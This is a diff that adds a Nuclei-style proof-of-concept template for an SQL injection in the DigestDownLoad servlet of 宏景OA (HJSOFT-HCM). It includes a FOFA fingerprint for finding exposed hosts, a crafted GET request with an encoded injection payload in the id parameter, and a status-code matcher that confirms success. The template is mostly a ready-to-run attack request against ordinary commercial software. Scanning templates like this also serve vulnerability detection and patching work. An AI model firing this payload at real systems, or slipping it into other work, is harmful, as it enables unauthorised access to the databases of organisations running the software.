@@ -1,0 +1,29 @@
+id: poc-gmlabtvlr306q0w2
+info:
+  name: 宏景OA DigestDownLoad存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gmlabtvlr306q0w2'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gmlabtvlr306q0w2
+    fofa: app="HJSOFT-HCM"
+http:
+- raw:
+  - 'GET /servlet/DigestDownLoad?type=original&id=i8hoHAILh4YkvJtIAayRbgJzqZUPAATTP2HJBPAATTPfhxbhGm4jOsPAATTP2HJFPAATTPyM8PAATTP3HJDPAATTP HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 302
+    type: status
